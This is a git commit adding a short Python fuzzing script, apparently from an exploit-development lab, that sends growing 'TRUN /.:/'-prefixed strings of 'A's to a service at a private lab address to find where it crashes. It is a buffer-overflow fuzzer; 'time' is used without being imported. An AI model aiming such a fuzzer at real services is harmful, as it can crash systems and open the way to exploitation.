cb9854bd9c38ac12c6b1c64a4cd2735e8a71728e
krm <73038148+3xg3lin@users.noreply.github.com>
2023-02-14 10:31:31 +0300

    Add files via upload

---
+++ Buffer overflow/fuzzing.py
@@ -0,0 +1,22 @@
+import socket
+import sys
+
+numberofchar = 100
+
+string_to_send = "TRUN /.:/" + "A" * numberofchar
+while True:
+    try:
+        mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        mySocket.connect(("10.0.2.15",9999))
+        mySocket.send(string_to_send.encode(encoding="latin1"))
+        mySocket.close()
+        string_to_send = string_to_send + "A" * 100
+        time.sleep(1)
+    except KeyboardInterrupt:
+        print("Crashed at: " + str(len(string_to_send)))
+        sys.exit()
+    except Exception:
+        print("Crashed at: " + str(len(string_to_send)))
+        print(Exception)
+        sys.exit()
+        
